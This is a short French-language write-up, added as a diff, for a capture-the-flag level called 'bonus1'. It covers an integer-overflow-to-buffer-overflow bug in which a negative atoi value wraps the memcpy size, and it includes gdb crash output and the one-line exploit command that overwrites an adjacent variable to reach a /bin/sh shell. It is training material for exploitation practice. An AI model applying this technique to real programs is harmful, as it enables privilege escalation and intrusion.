@@ -1,0 +1,37 @@
+comparaison résultat atoi < 9
+si oui memcpy avec size = 4 * resultat atoi
+sinon return
+atoi overflow ?
+si input > 2147483647 => input = 2147483647
+par contre si input < 0 => input = 0
+
+plus loin dans le code on voit que l'argument passé en paramètre est réutilisé pour set la taille du memcpy
+
+si arg = -1 => buffer size = 4294967292
+
+si arg = -1073741808 => buffer size = 64
+
+***************************inutile*******************************
+
+(gdb) r -1073741808 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Starting program: /home/user/bonus1/bonus1 -1073741808 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x39624138 in ?? ()
+
+offset is 56
+
+*****************************************************************
+
+execl à la fin du programme avec pour argument :
+execl("/bin/sh", "sh",0)
+
+on accède à ce bout de code uniquement si le retour de la variable déclarée après le buffer est = 0x574f4c46
+
+la variable est à la suite du buffer dans la mémoire
+il faut donc pouvoir remplir le buffer puis remplir la variable qui suit avec la valeur 0x574f4c46 => \x46\x4c\x4f\x57
+il faut un buffer de taille minimum 44 (40 pour le buffer et 4 pour la valeur à assigner)
+
+./bonus1 -1073741813 $(python -c 'print "\x41" * 40 + "\x46\x4c\x4f\x57"')
+
+à noter qu'on pourrait prendre un buffer plus grand tant qu'on écrit au même endroit
